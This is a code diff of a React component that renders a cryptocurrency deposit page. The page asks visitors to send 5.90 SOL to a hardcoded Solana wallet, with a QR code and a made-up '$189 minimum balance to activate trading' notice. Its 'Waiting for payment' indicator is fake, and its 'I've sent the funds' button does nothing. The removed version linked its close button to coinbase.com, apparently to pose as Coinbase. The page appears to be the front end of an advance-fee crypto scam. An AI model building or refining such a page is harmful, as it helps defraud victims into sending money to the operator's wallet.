@@ -1,114 +1,106 @@
 "use client";
 
-import { Copy, X } from "lucide-react";
+import { Copy } from "lucide-react";
 import { useState } from "react";
 
 const wallet = "AVL315ZjNhfzfPsSYAM1U3T1f9sXcEwfKybbZWk5EBTY";
 
-export default function DepositStep() {
+export default function DepositScreen() {
   const [copied, setCopied] = useState(false);
 
-const copyWallet = async () => {
-  try {
-    await navigator.clipboard.writeText(wallet);
-  } catch {
-    const textArea = document.createElement("textarea");
-    textArea.value = wallet;
-    document.body.appendChild(textArea);
-    textArea.select();
-    document.execCommand("copy");
-    document.body.removeChild(textArea);
-  }
+  const copyWallet = async () => {
+    try {
+      await navigator.clipboard.writeText(wallet);
+    } catch {
+      const textArea = document.createElement("textarea");
+      textArea.value = wallet;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textArea);
+    }
 
-  setCopied(true);
-  setTimeout(() => setCopied(false), 1200);
-};
+    setCopied(true);
+    setTimeout(() => setCopied(false), 1200);
+  };
 
   return (
-<div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60">
+    <div className="min-h-screen bg-[#f6f7fb] flex justify-center">
+      <div className="w-full max-w-[460px] px-5 pt-6 pb-10">
 
-      <div className="relative w-full max-w-[460px] rounded-[22px] bg-[#202127] px-[28px] pb-[28px] pt-[26px] shadow-2xl">
+        {/* HEADER */}
+        <div className="mb-6 flex items-center justify-between">
+          <h1 className="text-[22px] font-[700]">Deposit</h1>
+          <span className="text-gray-400 text-xl">⋯</span>
+        </div>
 
-        {/* Close */}
-        <button
-  onClick={() => {
-    window.location.href = "https://www.coinbase.com";
-  }}
-  className="absolute right-[22px] top-[22px] text-white/80"
->
-  <X size={24} />
-</button>
+        {/* CARD PRINCIPAL */}
+        <div className="rounded-[20px] bg-white p-5 shadow-sm">
 
-        {/* Title */}
-        <h1 className="mb-[20px] text-[24px] font-[700] text-center">
-          Add crypto to your account 
-        </h1>
-
-<div className="mb-[18px] rounded-[12px] border border-[#2f3541] bg-[#14151a] px-[14px] py-[12px]">
-  <p className="text-[13px] font-[600] text-[#facc15]">
-    To avoid commissions that would deplete your funds, 
-    it is necessary to have a minimum balance of $189 in your account.
-
-  </p>
-</div>
-
-        {/* Solana badge */}
-        <div className="mb-[18px] flex justify-center">
-          <div className="flex items-center gap-[10px] rounded-full bg-[#14151a] px-[16px] py-[8px]">
-            <img
-  src="/solana.png"
-  alt="Solana"
-  className="h-[18px] w-[18px]"
-/>
-            <span className="text-[14px] font-[700]">Solana (SOL)</span>
+          {/* BADGE */}
+          <div className="mb-4 flex justify-center">
+            <div className="flex items-center gap-2 rounded-full bg-gray-100 px-4 py-2">
+              <img src="/solana.png" className="h-5 w-5" />
+              <span className="text-[14px] font-[600]">
+                Solana (SOL)
+              </span>
+            </div>
           </div>
-        </div>
 
-        {/* QR IMAGE */}
-        <div className="mb-[20px] flex justify-center">
-          <img
-            src="/qr-code.png" // 👉 cambia este archivo en /public
-            alt="QR"
-            className="h-[220px] w-[220px] rounded-[16px] bg-white p-[10px]"
-          />
-        </div>
+          {/* QR */}
+          <div className="mb-4 flex justify-center">
+            <img
+              src="/qr-code.png"
+              className="h-[200px] w-[200px] rounded-[16px] border p-2 bg-white"
+            />
+          </div>
 
-        <p className="mb-[16px] text-center text-[14px] text-[#a1a1aa]">
-          Scan or send 5.90 SOL to this address
-        </p>
+          {/* TEXT */}
+          <p className="mb-4 text-center text-[14px] text-gray-500">
+            Send <span className="font-[600] text-black">5.90 SOL</span> to this address
+          </p>
 
-        {/* Wallet */}
-        <div className="mb-[16px] rounded-[12px] border border-white/10 bg-[#18191f] px-[16px] py-[14px]">
-          <div className="flex items-center gap-[10px]">
+          {/* WALLET */}
+          <div className="mb-4 flex items-center gap-2 rounded-[12px] bg-gray-100 px-4 py-3">
             <p className="flex-1 truncate text-[14px] font-[600]">
               {wallet}
             </p>
 
             <button
               onClick={copyWallet}
-              className="grid h-[38px] w-[38px] place-items-center rounded-full bg-[#2f3036]"
+              className="h-9 w-9 flex items-center justify-center rounded-full bg-white"
             >
               <Copy size={16} />
             </button>
           </div>
+
+          {/* STATUS */}
+          <div className="mb-4 flex items-center justify-center gap-2 text-sm">
+            <span className="h-2 w-2 animate-pulse rounded-full bg-green-500" />
+            <span className="text-gray-500">
+              Waiting for payment...
+            </span>
+          </div>
+
+          {/* BUTTON */}
+          <button className="w-full rounded-full bg-blue-500 py-3 text-[15px] font-[700] text-white">
+            I’ve sent the funds
+          </button>
+
+          {copied && (
+            <p className="mt-2 text-center text-xs text-gray-400">
+              Wallet copied
+            </p>
+          )}
         </div>
 
-        {/* Waiting */}
-        <div className="mb-[18px] flex items-center justify-center gap-[8px] text-[13px]">
-          <span className="h-[8px] w-[8px] animate-pulse rounded-full bg-green-400" />
-          <span className="text-[#9ca3af]">Waiting for payment...</span>
-        </div>
-
-        {/* Button */}
-        <button className="h-[52px] w-full rounded-full bg-[#5888ff] text-[15px] font-[700] text-black">
-           Add funds to proceed 
-        </button>
-
-        {copied && (
-          <p className="mt-[10px] text-center text-[12px] text-[#9ca3af]">
-            Wallet copied
+        {/* INFO CARD */}
+        <div className="mt-5 rounded-[16px] bg-yellow-50 p-4">
+          <p className="text-[13px] font-[600] text-yellow-700">
+            Minimum balance required: $189 to activate trading
           </p>
-        )}
+        </div>
+
       </div>
     </div>
   );
